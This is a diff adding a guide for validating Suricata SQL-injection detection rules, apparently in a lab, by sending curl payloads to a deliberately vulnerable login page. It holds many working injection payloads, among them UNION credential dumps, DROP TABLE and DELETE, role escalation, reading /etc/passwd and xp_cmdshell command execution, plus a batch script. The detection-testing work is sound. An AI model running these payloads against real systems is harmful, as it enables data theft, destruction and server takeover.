@@ -1,0 +1,358 @@
+# SQL Injection Test Payloads for Suricata Rule Validation
+
+## Testing Guide
+
+**Setup:**
+1. Terminal 1: `tail -f /var/log/suricata/eve.json | jq 'select(.alert.signature_id >= 1000200)'`
+2. Terminal 2: Open browser to http://testlab.local/test-lab/login_vulnerable.php
+3. Terminal 3: Run curl commands below
+
+---
+
+## Boolean-Based SQLi Payloads
+
+### SID: 1000200 - OR 1=1 with comment
+```bash
+# Test 1: Basic OR 1=1
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' OR 1=1 --&password=test"
+
+# Expected Alert: SQL Injection - OR 1=1 with comment (SID:1000200)
+
+# Test 2: With space variations
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' OR 1 = 1 --&password=test"
+
+# Test 3: Single quotes
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' or 1=1 --&password=test"
+```
+
+### SID: 1000201 - AND boolean injection
+```bash
+# Test 1: Basic AND 1=1
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' AND 1=1 --&password=test"
+
+# Expected Alert: SQL Injection - AND boolean injection (SID:1000201)
+
+# Test 2: Different comparison
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' AND 2>1 --&password=test"
+```
+
+### SID: 1000202 - OR string comparison
+```bash
+# Test 1: String comparison
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' OR 'a'='a&password=test"
+
+# Expected Alert: SQL Injection - OR string comparison (SID:1000202)
+
+# Test 2: Double quotes
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin\" OR \"a\"=\"a&password=test"
+```
+
+---
+
+## Comment Injection Payloads
+
+### SID: 1000203 - Double dash comment
+```bash
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' --&password=test"
+
+# Expected Alert: SQL Injection - Double dash comment (SID:1000203)
+```
+
+### SID: 1000204 - Hash comment
+```bash
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' #&password=test"
+
+# Expected Alert: SQL Injection - Hash comment (SID:1000204)
+```
+
+### SID: 1000205 - Block comment
+```bash
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' /*&password=test"
+
+# Expected Alert: SQL Injection - Block comment (SID:1000205)
+```
+
+---
+
+## SELECT/UNION-Based SQLi Payloads
+
+### SID: 1000207 - SELECT FROM statement
+```bash
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' UNION SELECT * FROM users --&password=test"
+
+# Expected Alert: SQL Injection - SELECT FROM statement (SID:1000207)
+```
+
+### SID: 1000208 - UNION SELECT injection
+```bash
+# Test 1: Basic UNION SELECT
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' UNION SELECT username, password FROM users --&password=test"
+
+# Expected Alert: SQL Injection - UNION SELECT injection (SID:1000208)
+
+# Test 2: UNION ALL SELECT
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' UNION ALL SELECT username, password FROM users --&password=test"
+```
+
+### SID: 1000209 - UNION NULL enumeration
+```bash
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' UNION SELECT NULL, NULL FROM users --&password=test"
+
+# Expected Alert: SQL Injection - UNION NULL enumeration (SID:1000209)
+```
+
+---
+
+## Time-Based Blind SQLi Payloads
+
+### SID: 1000210 - SLEEP() time-based
+```bash
+# Test 1: MySQL SLEEP
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' AND SLEEP(5) --&password=test"
+
+# Expected Alert: SQL Injection - SLEEP() time-based (SID:1000210)
+# Note: Request will take 5+ seconds to complete
+
+# Test 2: SLEEP in password
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin&password=test' OR SLEEP(3) --"
+```
+
+### SID: 1000211 - BENCHMARK() time-based
+```bash
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' AND BENCHMARK(50000000, SHA1('test')) --&password=test"
+
+# Expected Alert: SQL Injection - BENCHMARK() time-based (SID:1000211)
+```
+
+### SID: 1000212 - WAITFOR DELAY (MSSQL)
+```bash
+# This only works if testing against MSSQL database
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' WAITFOR DELAY '00:00:05' --&password=test"
+
+# Expected Alert: SQL Injection - WAITFOR DELAY (SID:1000212)
+```
+
+---
+
+## Error-Based SQLi Payloads
+
+### SID: 1000214 - EXTRACTVALUE()
+```bash
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' AND EXTRACTVALUE(0x0a, CONCAT(0x5e, (SELECT user()))) --&password=test"
+
+# Expected Alert: SQL Injection - EXTRACTVALUE() (SID:1000214)
+```
+
+### SID: 1000215 - UPDATEXML()
+```bash
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' AND UPDATEXML(0, CONCAT(0x5e, (SELECT version())), 0) --&password=test"
+
+# Expected Alert: SQL Injection - UPDATEXML() (SID:1000215)
+```
+
+---
+
+## Stacked Query Payloads
+
+### SID: 1000217 - DROP/TRUNCATE
+```bash
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin'; DROP TABLE users --&password=test"
+
+# Expected Alert: SQL Injection - DROP/TRUNCATE (SID:1000217)
+# Note: This would actually delete the table on vulnerable page
+```
+
+### SID: 1000218 - DELETE
+```bash
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin'; DELETE FROM users WHERE 1=1 --&password=test"
+
+# Expected Alert: SQL Injection - DELETE statement (SID:1000218)
+```
+
+### SID: 1000219 - INSERT/UPDATE
+```bash
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin'; UPDATE users SET role='admin' --&password=test"
+
+# Expected Alert: SQL Injection - INSERT/UPDATE (SID:1000219)
+```
+
+---
+
+## File I/O Payloads
+
+### SID: 1000220 - INTO OUTFILE
+```bash
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin' UNION SELECT username, password FROM users INTO OUTFILE '/tmp/dump.txt' --&password=test"
+
+# Expected Alert: SQL Injection - INTO OUTFILE (SID:1000220)
+```
+
+### SID: 1000222 - LOAD DATA INFILE
+```bash
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users --&password=test"
+
+# Expected Alert: SQL Injection - LOAD DATA INFILE (SID:1000222)
+```
+
+---
+
+## RCE Payloads (MSSQL/PostgreSQL specific)
+
+### SID: 1000223 - xp_cmdshell (MSSQL)
+```bash
+# Only works if MSSQL database is used
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin'; EXEC xp_cmdshell 'dir' --&password=test"
+
+# Expected Alert: SQL Injection - MSSQL xp_cmdshell (SID:1000223)
+```
+
+### SID: 1000224 - sp_oacreate (MSSQL)
+```bash
+curl -X POST http://testlab.local/test-lab/login_vulnerable.php \
+  -d "username=admin'; EXEC sp_oacreate 'WScript.Shell' --&password=test"
+
+# Expected Alert: SQL Injection - MSSQL sp_oacreate (SID:1000224)
+```
+
+---
+
+## Batch Testing Script
+
+### File: `test_all_payloads.sh`
+
+```bash
+#!/bin/bash
+
+TARGET="http://testlab.local/test-lab/login_vulnerable.php"
+SLEEP_TIME=2
+
+echo "🚀 Starting SQL Injection Payload Tests..."
+echo "⏱️  Waiting for alerts... (monitor /var/log/suricata/eve.json in another terminal)"
+echo ""
+
+# Boolean SQLi
+echo "[1] Testing Boolean SQLi - OR 1=1"
+curl -s -X POST $TARGET -d "username=admin' OR 1=1 --&password=test" > /dev/null
+sleep $SLEEP_TIME
+
+echo "[2] Testing Boolean SQLi - AND 1=1"
+curl -s -X POST $TARGET -d "username=admin' AND 1=1 --&password=test" > /dev/null
+sleep $SLEEP_TIME
+
+# UNION
+echo "[3] Testing UNION SELECT"
+curl -s -X POST $TARGET -d "username=admin' UNION SELECT username, password FROM users --&password=test" > /dev/null
+sleep $SLEEP_TIME
+
+# Time-based
+echo "[4] Testing SLEEP() - this will be slow..."
+timeout 10 curl -s -X POST $TARGET -d "username=admin' AND SLEEP(5) --&password=test" > /dev/null
+sleep $SLEEP_TIME
+
+# Error-based
+echo "[5] Testing EXTRACTVALUE()"
+curl -s -X POST $TARGET -d "username=admin' AND EXTRACTVALUE(0x0a, CONCAT(0x5e, (SELECT user()))) --&password=test" > /dev/null
+sleep $SLEEP_TIME
+
+# Stacked queries
+echo "[6] Testing DROP TABLE"
+curl -s -X POST $TARGET -d "username=admin'; DROP TABLE users --&password=test" > /dev/null
+sleep $SLEEP_TIME
+
+echo ""
+echo "✅ All payloads sent!"
+echo "🔍 Check Suricata alerts for detections (SID 1000200-1000232)"
+```
+
+Save and run:
+```bash
+chmod +x test_all_payloads.sh
+./test_all_payloads.sh
+```
+
+---
+
+## Monitoring Alerts
+
+### Terminal 1: Watch JSON alerts
+```bash
+tail -f /var/log/suricata/eve.json | jq -c '{timestamp: .timestamp, sid: .alert.signature_id, msg: .alert.msg, src_ip: .src_ip}'
+```
+
+### Terminal 2: Count by SID
+```bash
+tail -f /var/log/suricata/eve.json | jq -r 'select(.alert) | .alert.signature_id' | sort | uniq -c
+```
+
+### Terminal 3: Filter by rule
+```bash
+# Watch only OR 1=1 injection attempts
+tail -f /var/log/suricata/eve.json | jq 'select(.alert.signature_id == 1000200)'
+```
+
+---
+
+## Expected Results
+
+**✅ Vulnerable Page (login_vulnerable.php):**
+- All payloads should be detected by Suricata
+- Actual SQL injection may succeed (showing results)
+
+**✅ Secure Page (login_secure.php):**
+- SQL injection payloads will NOT work
+- Database will reject invalid credentials
+- No actual exploitation possible
+
+---
+
+## Troubleshooting
+
+### No alerts?
+1. Check Suricata is running: `systemctl status suricata`
+2. Verify rules loaded: `grep "sql_injection" /var/log/suricata/suricata.log`
+3. Check firewall isn't blocking: `sudo iptables -L | grep HTTP`
+4. Monitor traffic: `sudo tcpdump -i eth0 'tcp port 80' -w capture.pcap`
+
+### Getting wrong SID?
+1. Verify rule SIDs: `grep "sid:10002" /etc/suricata/rules/sql_injection_rules_CLEAN_1000200.rules`
+2. Check eve.json: `jq '.alert.signature_id' /var/log/suricata/eve.json`
+
+### MySQL errors?
+1. Restart MySQL: `sudo systemctl restart mysql`
+2. Test connection: `mysql -u root -p testlab -e "SELECT COUNT(*) FROM users;"`
+3. Check user table exists: `mysql -u root -p testlab -e "SHOW TABLES;"`
+
+---
+
+## Notes
+
+- 🔴 **DO NOT** run destructive payloads (DROP, DELETE) on production databases
+- ⏱️ Time-based payloads will cause the request to hang - this is expected
+- 🛡️ The secure page (`login_secure.php`) should block all SQL injection attempts
+- 📊 All attempts are logged to `login_attempts` table - view via test_dashboard.php
